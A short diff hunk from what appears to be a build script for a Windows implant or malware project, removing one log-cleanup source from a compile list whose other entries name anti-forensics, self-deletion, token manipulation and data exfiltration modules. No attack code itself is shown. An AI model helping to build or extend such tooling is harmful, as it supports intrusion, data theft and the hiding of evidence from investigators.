@@ -197,7 +197,6 @@ def stage_compile_runtime(build_dir):
         WIN / "audit" / "audit.c",
         WIN / "anti_forensics" / "forensics.c",
         WIN / "anti_forensics" / "logs.c",
-        WIN / "anti_forensics" / "logs_cleanup.c",
         WIN / "anti_forensics" / "self_delete.c",
         WIN / "security" / "token_manipulation.c",
         WIN / "exfil" / "enhanced_exfiltration.c",
